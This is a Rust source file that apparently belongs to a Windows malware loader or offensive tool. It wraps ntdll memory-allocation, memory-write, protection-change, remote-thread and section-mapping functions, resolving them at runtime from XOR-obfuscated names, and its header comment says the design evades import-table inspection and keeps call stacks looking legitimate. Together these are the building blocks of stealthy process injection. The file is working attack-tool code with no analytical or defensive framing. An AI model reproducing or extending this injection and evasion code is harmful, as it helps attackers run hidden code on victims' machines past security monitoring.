// syscall.rs
// NT function wrappers resolved dynamically at runtime via XOR-obfuscated names.
//
// We call the actual ntdll function pointers directly rather than building
// custom syscall stubs.  The syscall instruction therefore executes inside
// ntdll's own code — bypassing Win32 IAT inspection while keeping the kernel
// call-stack valid (ntdll return address, not our binary).
//
// No custom assembly.  No SSN extraction.  No gadget chains.

use std::ffi::c_void;
use crate::dynload;

type FnNtAlloc   = unsafe extern "system" fn(*mut c_void, *mut *mut c_void, usize, *mut usize,   u32, u32) -> i32;
type FnNtWrite   = unsafe extern "system" fn(*mut c_void, *mut c_void, *const c_void, usize, *mut usize) -> i32;
type FnNtProtect = unsafe extern "system" fn(*mut c_void, *mut *mut c_void, *mut usize, u32, *mut u32) -> i32;
type FnNtThread  = unsafe extern "system" fn(*mut *mut c_void, u32, *const c_void, *mut c_void,
                                              *const c_void, *const c_void, u32, usize, usize, usize, *const c_void) -> i32;
// Section mapping
type FnNtCreateSection = unsafe extern "system" fn(*mut *mut c_void, u32, *const c_void, *mut i64, u32, u32, *mut c_void) -> i32;
type FnNtMapView       = unsafe extern "system" fn(*mut c_void, *mut c_void, *mut *mut c_void, usize, usize, *mut i64, *mut usize, u32, u32, u32) -> i32;
type FnNtUnmapView     = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;

static mut NT_ALLOC:          Option<FnNtAlloc>          = None;
static mut NT_WRITE:          Option<FnNtWrite>          = None;
static mut NT_PROTECT:        Option<FnNtProtect>        = None;
static mut NT_THREAD:         Option<FnNtThread>         = None;
static mut NT_CREATE_SECTION: Option<FnNtCreateSection>  = None;
static mut NT_MAP_VIEW:       Option<FnNtMapView>        = None;
static mut NT_UNMAP_VIEW:     Option<FnNtUnmapView>      = None;

pub unsafe fn init_syscalls() -> bool {
    macro_rules! load {
        ($slot:expr, $enc:expr, $ty:ty) => {{
            let raw = match dynload::nt_raw($enc) {
                Some(p) => p,
                None    => return false,
            };
            $slot = Some(std::mem::transmute::<*const c_void, $ty>(raw));
        }};
    }
    load!(NT_ALLOC,          dynload::N_NT_ALLOC,          FnNtAlloc);
    load!(NT_WRITE,          dynload::N_NT_WRITE,          FnNtWrite);
    load!(NT_PROTECT,        dynload::N_NT_PROTECT,        FnNtProtect);
    load!(NT_THREAD,         dynload::N_NT_THREAD,         FnNtThread);
    load!(NT_CREATE_SECTION, dynload::N_NT_CREATE_SECTION, FnNtCreateSection);
    load!(NT_MAP_VIEW,       dynload::N_NT_MAP_VIEW,       FnNtMapView);
    load!(NT_UNMAP_VIEW,     dynload::N_NT_UNMAP_VIEW,     FnNtUnmapView);
    true
}

pub unsafe fn nt_alloc_virtual_memory(
    process_handle:  *mut c_void,
    base_address:    *mut *mut c_void,
    zero_bits:       usize,
    region_size:     *mut usize,
    allocation_type: u32,
    protect:         u32,
) -> i32 {
    match NT_ALLOC {
        Some(f) => f(process_handle, base_address, zero_bits, region_size, allocation_type, protect),
        None    => -1,
    }
}

pub unsafe fn nt_write_virtual_memory(
    process_handle: *mut c_void,
    base_address:   *mut c_void,
    buffer:         *const c_void,
    bytes_to_write: usize,
    bytes_written:  *mut usize,
) -> i32 {
    match NT_WRITE {
        Some(f) => f(process_handle, base_address, buffer, bytes_to_write, bytes_written),
        None    => -1,
    }
}

pub unsafe fn nt_protect_virtual_memory(
    process_handle: *mut c_void,
    base_address:   *mut *mut c_void,
    region_size:    *mut usize,
    new_protect:    u32,
    old_protect:    *mut u32,
) -> i32 {
    match NT_PROTECT {
        Some(f) => f(process_handle, base_address, region_size, new_protect, old_protect),
        None    => -1,
    }
}

pub unsafe fn nt_create_thread_ex(
    thread_handle:     *mut *mut c_void,
    desired_access:    u32,
    object_attributes: *const c_void,
    process_handle:    *mut c_void,
    start_routine:     *const c_void,
    argument:          *const c_void,
    create_flags:      u32,
    zero_bits:         usize,
    stack_size:        usize,
    maximum_stack:     usize,
    attribute_list:    *const c_void,
) -> i32 {
    match NT_THREAD {
        Some(f) => f(thread_handle, desired_access, object_attributes, process_handle,
                     start_routine, argument, create_flags, zero_bits, stack_size,
                     maximum_stack, attribute_list),
        None    => -1,
    }
}

pub unsafe fn nt_create_section(
    section_handle:    *mut *mut c_void,
    desired_access:    u32,
    object_attributes: *const c_void,
    maximum_size:      *mut i64,
    section_protect:   u32,
    allocation_attr:   u32,
    file_handle:       *mut c_void,
) -> i32 {
    match NT_CREATE_SECTION {
        Some(f) => f(section_handle, desired_access, object_attributes, maximum_size,
                     section_protect, allocation_attr, file_handle),
        None    => -1,
    }
}

pub unsafe fn nt_map_view_of_section(
    section_handle:  *mut c_void,
    process_handle:  *mut c_void,
    base_address:    *mut *mut c_void,
    zero_bits:       usize,
    commit_size:     usize,
    section_offset:  *mut i64,
    view_size:       *mut usize,
    inherit_disp:    u32,
    allocation_type: u32,
    win32_protect:   u32,
) -> i32 {
    match NT_MAP_VIEW {
        Some(f) => f(section_handle, process_handle, base_address, zero_bits, commit_size,
                     section_offset, view_size, inherit_disp, allocation_type, win32_protect),
        None    => -1,
    }
}

pub unsafe fn nt_unmap_view_of_section(
    process_handle: *mut c_void,
    base_address:   *mut c_void,
) -> i32 {
    match NT_UNMAP_VIEW {
        Some(f) => f(process_handle, base_address),
        None    => -1,
    }
}
